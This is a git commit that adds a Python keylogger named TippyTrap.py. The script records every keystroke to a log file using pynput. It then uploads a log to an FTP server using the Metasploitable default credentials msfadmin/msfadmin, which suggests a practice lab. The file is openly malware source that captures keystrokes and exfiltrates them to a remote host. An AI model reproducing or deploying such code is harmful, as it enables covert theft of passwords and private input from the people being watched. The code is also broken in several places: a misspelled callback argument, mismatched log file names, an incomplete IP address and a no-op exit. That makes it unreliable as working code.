07eb7946f88bdcf5d25736d5104136d021d18443
cyborgsri <25740548+cyborgsri@users.noreply.github.com>
2019-06-30 23:39:47 +0530

    KeyL First Commit
    KeyLog and logstxt

---
+++ TippyTrap.py
@@ -0,0 +1,35 @@
+import ftplib
+import logging
+from pynput.keyboard import Key,Listener 
+
+logdir =''
+
+logging.basicConfig(filename=(logdir+"klogs002.txt"),level=logging.DEBUG,format="%(asctime)s:%(message)s")
+
+def pressing_key(Key):
+    try:
+        logging.info(str(Key))
+    except AttributeError:
+        print("A special key {0} is pressed ".format(Key))
+
+def releasing_key(key):
+    if Key == key.esc:
+        print("False")
+skey = "*"
+def stop(Key):
+    if Key == skey:
+        print("stopped")
+        exit
+        
+print('\nStart Listening..\n')
+
+with Listener(on_press=pressing_key,on_relase=releasing_key) as listener:
+    listener.join()
+
+print("\nConnectiong to the FTP module and sending the data..")
+
+sess= ftplib.FTP("192.168.68", "msfadmin", "msfadmin")
+file = open("klogs.txt","rb")
+sess.storbinary("STOR klogs.txt",file)
+file.close()
+sess.quit()
